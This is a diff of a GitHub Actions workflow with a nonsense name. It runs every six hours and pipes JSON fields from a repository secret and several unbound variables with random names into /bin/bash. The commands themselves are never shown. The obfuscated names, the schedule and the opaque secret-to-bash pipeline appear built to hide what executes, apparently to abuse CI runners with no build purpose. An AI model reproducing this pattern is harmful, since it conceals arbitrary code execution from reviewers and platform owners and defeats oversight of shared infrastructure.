@@ -1,24 +1,29 @@
 name: holylishit
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 0/6 * * *'
+    - cron: '57 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: holylishit
         env:
-          izgh826: ${{ secrets.izgh826 }}
+          uykn1: ${{ secrets.uykn1 }}
         run: |
-          echo $izgh826 | jq -r .jug987 | /bin/bash
-          echo $xtn4 | jq -r .g0 | /bin/bash
-          echo $mm160 | jq -r .u812 | /bin/bash
-          echo $oacp2 | jq -r .zcm92865 | /bin/bash
-          echo $pr82180 | jq -r .p95 | /bin/bash
-          echo $ddi5 | jq -r .pxckg271 | /bin/bash
-          echo $ccjj85 | jq -r .hx04 | /bin/bash
-          echo $inra50489 | jq -r .a225 | /bin/bash
+          echo $uykn1 | jq -r .h7 | /bin/bash
+          echo $ulves62635 | jq -r .mh5 | /bin/bash
+          echo $yny66764 | jq -r .z8 | /bin/bash
+          echo $elry1 | jq -r .hsvcd900 | /bin/bash
+          echo $xmph82764 | jq -r .xismp91 | /bin/bash
+          echo $kj4247 | jq -r .tuf22 | /bin/bash
+          echo $g67 | jq -r .kh4 | /bin/bash
+          echo $rerqi00 | jq -r .asasy7842 | /bin/bash
+          echo $ta9 | jq -r .vkpqc6288 | /bin/bash
+          echo $dylm52 | jq -r .hh534 | /bin/bash
+          echo $cv5257 | jq -r .eoqw5305 | /bin/bash
+          echo $p37 | jq -r .uo09 | /bin/bash
 
